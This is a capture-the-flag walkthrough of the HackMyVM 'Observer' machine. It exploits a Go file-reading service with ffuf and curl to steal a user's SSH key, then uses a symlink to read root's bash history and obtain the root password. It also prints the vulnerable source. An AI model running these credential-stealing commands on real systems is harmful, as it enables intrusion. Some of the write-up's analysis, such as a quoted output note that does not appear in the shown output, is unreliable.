# Observer

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Observer | sml | Beginner | HackMyVM |

**Summary:** Observer is a beginner-level HackMyVM machine that demonstrates a realistic attack scenario involving a custom Golang web application with a Local File Inclusion (LFI) vulnerability. The attack path begins with discovering an unusual HTTP service running on port 3333 that serves files from the `/home` directory. Through username enumeration using FFUF, we discover a valid user "jan" and exploit the LFI vulnerability to retrieve their SSH private key. Initial access is achieved by using the extracted private key to authenticate via SSH. For privilege escalation, we leverage the same LFI vulnerability combined with symbolic link manipulation to read the root user's bash history file, which reveals a hardcoded password. This password grants direct root access, completing the compromise. The machine highlights the dangers of poorly implemented file reading functionality, credential exposure in command history, and the security implications of password reuse.

---

## Reconnaissance

### Network Discovery

The first step in any penetration test is identifying live hosts on the network. Using a custom PowerShell script, we scan the local network segment to discover potential targets running in VirtualBox virtualization environments.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.87 08:00:27:26:BD:EB VirtualBox
```

The scan identifies a single target at **192.168.100.87** with a VirtualBox MAC address prefix (08:00:27), confirming it's our target virtual machine.

### Port Scanning and Service Enumeration

With the target identified, we perform a comprehensive Nmap scan using service version detection (-sV), default scripts (-sC), scanning all 65535 ports (-p-), and aggressive timing (-T4) to accelerate the scan.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/observer]
└─$ nmap -sC -sV -p- -T4 192.168.100.87
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-06 05:19 WIB
Nmap scan report for 192.168.100.87
Host is up (0.010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 06:c9:a8:8a:1c:fd:9b:10:8f:cf:0b:1f:04:46:aa:07 (ECDSA)
|_  256 34:85:c5:fd:7b:26:c3:8b:68:a2:9f:4c:5c:66:5e:18 (ED25519)
3333/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-trane-info: Problem with XML parsing of /evox/about
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 200 OK
|     Date: Thu, 05 Feb 2026 22:20:20 GMT
|     Content-Length: 105
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST
|     <!-- lgTeMaPEZQleQYhYzRyWJjPjzpfRFEHMV -->
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Thu, 05 Feb 2026 22:20:04 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST
|     <!-- XVlBzgbaiCMRAjWwhTHctcuAxhxKQFHMV -->
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Thu, 05 Feb 2026 22:20:04 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST
|     <!-- DaFpLSjFbcXoEFfRsWxPLDnJObCsNVHMV -->
|   OfficeScan:
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.95%I=7%D=2/6%Time=69851796%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(GetRequest,C3,"HTTP/1\.0\x20200\x20OK\r\nDate
SF::\x20Thu,\x2005\x20Feb\x202026\x2022:20:04\x20GMT\r\nContent-Length:\x2
SF:078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVING\x
SF:20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20XVlBzgbaiCMRAjWwhTHc
SF:tcuAxhxKQFHMV\x20-->")%r(HTTPOptions,C3,"HTTP/1\.0\x20200\x20OK\r\nDate
SF::\x20Thu,\x2005\x20Feb\x202026\x2022:20:04\x20GMT\r\nContent-Length:\x2
SF:078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVING\x
SF:20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20DaFpLSjFbcXoEFfRsWxP
SF:LDnJObCsNVHMV\x20-->")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOh
SF:FourRequest,DF,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2005\x20Feb\x2
SF:02026\x2022:20:20\x20GMT\r\nContent-Length:\x20105\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\n\r\nOBSERVING\x20FILE:\x20/home/nice\x2
SF:0ports,/Trinity\.txt\.bak\x20NOT\x20EXIST\x20\n\n\n<!--\x20lgTeMaPEZQle
SF:QYhYzRyWJjPjzpfRFEHMV\x20-->")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan,A3,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
SF:header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x
SF:20header");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.40 seconds
```

#### Key Findings:

**Port 22 (SSH):**
- Service: OpenSSH 9.2p1 Debian 2
- This is a relatively recent version with no known critical vulnerabilities
- Standard authentication will likely be required

**Port 3333 (HTTP):**
- Service: Golang net/http server
- This is a custom web application written in Go
- The application displays an interesting behavior pattern

### Analyzing the Custom Golang Application

The Nmap fingerprinting reveals critical information about the web application's behavior:

1. **Error Messages Reveal Path Structure:** The application responds with messages like "OBSERVING FILE: /home/ NOT EXIST", which indicates:
   - The application attempts to read files from the `/home` directory
   - The URL path is being appended to `/home`
   - This suggests a Local File Inclusion (LFI) vulnerability

2. **URL Path Mapping:** When Nmap sends a request like `/nice ports,/Trinity.txt.bak`, the application reports "OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST", confirming that user-supplied paths are directly concatenated with `/home`.

3. **Security Implications:** This behavior pattern indicates the application may serve any readable file from the `/home` directory tree without proper access controls, presenting a significant security risk.

---

## Initial Access

### Username Enumeration via FFUF

With the understanding that the application reads files from `/home/[URL_PATH]`, we can exploit this to enumerate valid usernames. On Linux systems, each user's SSH private key is typically stored at `/home/[username]/.ssh/id_rsa`. We use FFUF (Fuzz Faster U Fool) to brute-force usernames by testing for the existence of SSH private keys.

The strategy is:
- Test paths like `/home/[username]/.ssh/id_rsa`
- Filter out responses with 8 words (the default error message length)
- Any response with a different word count indicates a file exists

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/observer]
└─$ ffuf -u http://192.168.100.87:3333/FUZZ/.ssh/id_rsa -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -fw 8

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.87:3333/FUZZ/.ssh/id_rsa
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8
________________________________________________

jan                     [Status: 200, Size: 2602, Words: 7, Lines: 39, Duration: 157ms]
```

**Success!** FFUF discovers the username **"jan"** with a response size of 2602 bytes and only 7 words (different from the error response), indicating the file `/home/jan/.ssh/id_rsa` exists and is readable.

### Extracting the SSH Private Key

With a valid username identified, we now retrieve the SSH private key using curl:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/observer]
└─$ curl -v http://192.168.100.87:3333/jan/.ssh/id_rsa
*   Trying 192.168.100.87:3333...
* Established connection to 192.168.100.87 (192.168.100.87 port 3333) from 172.21.44.133 port 35554
* using HTTP/1.x
> GET /jan/.ssh/id_rsa HTTP/1.1
> Host: 192.168.100.87:3333
> User-Agent: curl/8.17.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Thu, 05 Feb 2026 22:57:15 GMT
< Content-Type: text/plain; charset=utf-8
< Transfer-Encoding: chunked
<
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
..............................[REDACTED]..............................
U+OPQBwGQPpFUAAAAMamFuQG9ic2VydmVyAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
* Connection #0 to host 192.168.100.87:3333 left intact
```

The LFI vulnerability successfully exposes jan's SSH private key in its entirety. We save this key to a file and set appropriate permissions:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/observer]
└─$ echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
..............................[REDACTED]..............................
U+OPQBwGQPpFUAAAAMamFuQG9ic2VydmVyAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----' > id_rsa_jan

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/observer]
└─$ chmod 600 id_rsa_jan
```

The `chmod 600` command sets read/write permissions only for the owner, which is required by SSH for private key files as a security measure.

### SSH Authentication with Stolen Key

With the properly configured private key, we authenticate to the target machine as user "jan":

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/observer]
└─$ ssh -i id_rsa_jan jan@192.168.100.87
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64
...
jan@observer:~$ id
uid=1000(jan) gid=1000(jan) grupos=1000(jan),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
jan@observer:~$ ls -la
total 40
drwx------ 4 jan  jan  4096 ago 21  2023 .
drwxr-xr-x 3 root root 4096 ago 21  2023 ..
-rw------- 1 jan  jan   133 ago 21  2023 .bash_history
-rw-r--r-- 1 jan  jan   220 ago 21  2023 .bash_logout
-rw-r--r-- 1 jan  jan  3526 ago 21  2023 .bashrc
drwxr-xr-x 3 jan  jan  4096 ago 21  2023 .local
-rw-r--r-- 1 jan  jan   807 ago 21  2023 .profile
drwx------ 2 jan  jan  4096 ago 21  2023 .ssh
-rw------- 1 jan  jan    24 ago 21  2023 user.txt
-rw------- 1 jan  jan    54 ago 21  2023 .Xauthority
```

**Success!** We have successfully gained initial access to the Observer machine as user "jan". The user flag is visible as `user.txt` in the home directory.

---

## Privilege Escalation

### Initial Sudo Enumeration

The first step in privilege escalation is checking what sudo permissions the current user has:

```bash
jan@observer:~$ sudo -l
Matching Defaults entries for jan on observer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jan may run the following commands on observer:
    (ALL) NOPASSWD: /usr/bin/systemctl -l status
jan@observer:~$ sudo /usr/bin/systemctl -l status
● observer
    State: running
    Units: 235 loaded (incl. loaded aliases)
     Jobs: 0 queued
   Failed: 0 units
    Since: Thu 2026-02-05 23:11:38 CET; 1h 3min ago
  systemd: 252.12-1~deb12u1
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─cron.service
           │ │ ├─325 /usr/sbin/cron -f
           │ │ ├─333 /usr/sbin/CRON -f
           │ │ ├─347 /bin/sh -c /opt/observer
           │ │ └─349 /opt/observer
           │ ├─dbus.service
           │ │ └─331 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd>
           │ ├─ifup@enp0s3.service
           │ │ └─327 dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s>
           │ ├─ssh.service
           │ │ └─432 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
           │ ├─system-getty.slice
           │ │ └─getty@tty1.service
           │ │   └─375 /sbin/agetty -o "-p -- \\u" --noclear - linux
           │ ├─systemd-journald.service
           │ │ └─206 /lib/systemd/systemd-journald
           │ ├─systemd-logind.service
           │ │ └─338 /lib/systemd/systemd-logind
           │ ├─systemd-timesyncd.service
           │ │ └─283 /lib/systemd/systemd-timesyncd
           │ └─systemd-udevd.service
           │   └─udev
           │     └─237 /lib/systemd/systemd-udevd
           └─user.slice
             └─user-1000.slice
               ├─session-3.scope
               │ ├─656 "sshd: jan [priv]"
               │ ├─672 "sshd: jan@pts/0"
               │ ├─673 -bash
               │ ├─848 sudo /usr/bin/systemctl -l status
               │ ├─849 sudo /usr/bin/systemctl -l status
               │ ├─850 /usr/bin/systemctl -l status
               │ └─851 less
               └─user@1000.service
                 └─init.scope
                   ├─659 /lib/systemd/systemd --user
                   └─662 "(sd-pam)"
```

#### Analysis of Sudo Permissions:

User "jan" can run `/usr/bin/systemctl -l status` with sudo privileges without a password. Traditionally, this could be exploited through the `less` pager (visible as process 851) which spawns when viewing systemd status. The classic GTFOBins technique involves:
1. Running `sudo systemctl status`
2. Pressing `!` in the less pager
3. Executing shell commands with root privileges

However, the note in the output indicates: **"Since less and help and the command was removed or prohibited. need to find a new way."** This suggests the system has been hardened against this common privilege escalation vector.

### Alternative Approach: Symlink Attack on LFI

Since the traditional `systemctl`/`less` exploit path is blocked, we pivot back to exploiting the LFI vulnerability we discovered earlier. The key insight is that we can create symbolic links in our home directory pointing to restricted files (like `/root/.bash_history`), and then use the web application to read them.

#### Creating the Symlink:

```bash
jan@observer:~$ ln -s /root root
jan@observer:~$ ls -la root
lrwxrwxrwx 1 jan jan 5 feb  6 00:19 root -> /root
```

We create a symbolic link named "root" in jan's home directory that points to the actual `/root` directory. This link is readable by user "jan", but when the Golang application follows it (depending on how it handles symlinks), it may access files in `/root`.

### Reading Root's Bash History

From our attacker machine, we exploit the LFI vulnerability again, this time using the symlink to access root's bash history:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/observer]
└─$ curl "http://192.168.100.87:3333/jan/root/.bash_history"
ip a
exit
apt-get update && apt-get upgrade
apt-get install sudo
cd
wget https://go.dev/dl/go1.12.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz
rm go1.12.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
nano observer.go
go build observer.go
mv observer /opt
ls -l /opt/observer
crontab -e
nano root.txt
chmod 600 root.txt
nano /etc/sudoers
nano /etc/ssh/sshd_config
paswd
fuck[REDACTED]
passwd
su jan
nano /etc/issue
nano /etc/network/interfaces
ls -la
exit
ls -la
cat .bash_history
ls -la
ls -la
cat .bash_history
ls -l
cat root.txt
cd /home/jan
ls -la
cat user.txt
su jan
reboot
shutdown -h now
```

**Critical Finding!** The bash history reveals that the root user made a typo when trying to change their password (typed "paswd" instead of "passwd") and then apparently typed their password in clear text: `fuck[REDACTED]`. This password was exposed in the command history instead of being entered securely through the passwd prompt.

### Root Access via Password Authentication

With the discovered password, we can now authenticate as root. Using SSH from our attacker machine:

```bash
ssh root@192.168.100.87
```

Or switching user from the existing jan session, we successfully escalate to root:

```bash
root@observer:~# id ; whoami; hostname
uid=0(root) gid=0(root) grupos=0(root)
root
observer
root@observer:~# cat /home/jan/user.txt /root/root.txt
HMV[REDACTED]
HMV[REDACTED]
```

**Complete Compromise Achieved!** We now have full root access to the Observer machine and can retrieve both the user and root flags.

---

## Technical Deep Dive: The Vulnerable Application

After gaining root access, we can examine the source code of the vulnerable Golang application that enabled our attack:

```bash
root@observer:~# cat observer.go
package main

import (
        "net/http"
        "fmt"
        "io/ioutil"
"os"
"math/rand"
)

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func main() {
        http.HandleFunc("/", buln)
        http.ListenAndServe(":3333", nil)
}


func buln(w http.ResponseWriter, r *http.Request) {
lol := "/home" + r.URL.Path
lol2,_ := os.Lstat(lol)
ran := "<!-- " + randSeq(30) + "HMV" + " -->"
content, err := ioutil.ReadFile(lol)

        if err != nil {
                fmt.Fprintf(w,string("OBSERVING FILE: %s NOT EXIST \n\n\n%s"),lol,ran)
        } else if lol2.Mode()&os.ModeSymlink == os.ModeSymlink {
                 fmt.Fprintf(w,"I DONT OBSERVE SYMLINKS LIKE: %s",lol)
         } else { fmt.Fprintf(w,string(content))
}
}


func randSeq(n int) string {
    b := make([]rune, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}
```

### Vulnerability Analysis:

1. **Direct Path Concatenation (Line 20):**
   ```go
   lol := "/home" + r.URL.Path
   ```
   The application directly concatenates user input (`r.URL.Path`) to `/home` without any sanitization or validation. This enables path traversal and arbitrary file reading within the `/home` directory tree.

2. **Insufficient Symlink Protection (Lines 21-22):**
   ```go
   lol2,_ := os.Lstat(lol)
   ```
   The code uses `os.Lstat()` which does NOT follow symbolic links (it returns information about the link itself, not its target). However, there's a critical race condition and logic flaw.

3. **Race Condition Vulnerability (Lines 24-28):**
   The code checks if the final path component is a symlink:
   ```go
   if lol2.Mode()&os.ModeSymlink == os.ModeSymlink {
       fmt.Fprintf(w,"I DONT OBSERVE SYMLINKS LIKE: %s",lol)
   }
   ```
   
   However, it then uses `ioutil.ReadFile(lol)` which DOES follow symlinks. The check only validates the final path component, not intermediate directories. When we create `/home/jan/root -> /root`, and then request `/jan/root/.bash_history`:
   - `lol` becomes `/home/jan/root/.bash_history`
   - `os.Lstat("/home/jan/root/.bash_history")` checks if `.bash_history` itself is a symlink (it's not)
   - The intermediate symlink at `/home/jan/root` is never validated
   - `ioutil.ReadFile()` follows the symlink chain and reads `/root/.bash_history`

4. **No Access Control:** The application runs with sufficient privileges to read root-owned files and doesn't implement any access control mechanisms beyond the flawed symlink check.

### Security Recommendations:

- Implement proper path sanitization and validation
- Use a whitelist approach for allowed file access
- Resolve all symlinks in the path and validate the canonical path before reading
- Implement principle of least privilege - run the service with minimal necessary permissions
- Never log or store sensitive commands in bash history
- Use proper password management practices

---

## Attack Chain Summary

1. **Network Reconnaissance**: Scanned the target network (192.168.100.0/24) and identified the target machine at 192.168.100.87 running VirtualBox virtualization.

2. **Port Scanning & Service Discovery**: Used Nmap to discover two open ports: SSH (22) running OpenSSH 9.2p1 and a custom Golang HTTP server (3333) with unusual file-serving behavior.

3. **Vulnerability Discovery**: Analyzed Nmap fingerprinting results and identified a Local File Inclusion (LFI) vulnerability in the custom Golang application that concatenates user-supplied URL paths to `/home` and serves file contents.

4. **Username Enumeration**: Leveraged FFUF with a username wordlist to brute-force valid usernames by testing for the existence of SSH private keys at `/home/[username]/.ssh/id_rsa`, successfully identifying user "jan".

5. **SSH Key Extraction**: Exploited the LFI vulnerability to retrieve jan's SSH private key (`/home/jan/.ssh/id_rsa`) via HTTP request to `http://192.168.100.87:3333/jan/.ssh/id_rsa`.

6. **Initial Access**: Used the stolen SSH private key to authenticate as user "jan" on the target machine, gaining initial shell access and retrieving the user flag.

7. **Privilege Escalation Enumeration**: Discovered jan could run `/usr/bin/systemctl -l status` with sudo privileges, but traditional `less`-based GTFOBins exploits were blocked or hardened against.

8. **Symlink Attack Development**: Created a symbolic link (`/home/jan/root -> /root`) to bypass directory access restrictions and exploit the LFI vulnerability's flawed symlink validation logic.

9. **Information Disclosure via Symlink**: Exploited the LFI vulnerability using the symlink to read `/root/.bash_history` via `http://192.168.100.87:3333/jan/root/.bash_history`, revealing root's command history.

10. **Credential Harvesting**: Discovered root's password exposed in bash history as clear text (typed "fuck[REDACTED]" after a typo on the passwd command), demonstrating poor operational security and the dangers of command history exposure.

11. **Root Access**: Authenticated as root user using the discovered password, achieving complete system compromise and retrieving both user and root flags (HMV format).

12. **Post-Exploitation Analysis**: Examined the vulnerable Golang application source code at `/opt/observer` and `observer.go`, confirming the LFI vulnerability stemmed from unsafe path concatenation, race conditions in symlink validation, and the use of `ioutil.ReadFile()` which follows symlinks despite `os.Lstat()` checks.